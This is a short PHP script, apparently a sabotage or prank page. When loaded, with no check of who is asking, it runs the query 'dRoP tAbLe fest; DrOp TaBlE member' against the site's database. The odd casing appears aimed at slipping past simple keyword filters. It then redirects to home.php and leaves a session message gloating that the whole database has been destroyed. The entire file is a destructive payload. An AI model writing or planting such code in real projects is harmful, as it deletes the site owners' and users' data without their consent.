<?php

require_once "connect_server.php";

session_start();

$query = "dRoP tAbLe fest; DrOp TaBlE member";
$connection->exec($query);

header("Location: home.php");

$_SESSION["CHAOS"] = "<p style='font-size:210px;'>GG WP, you destroyed the whole database. OP B8 M8!.!</p>";

?>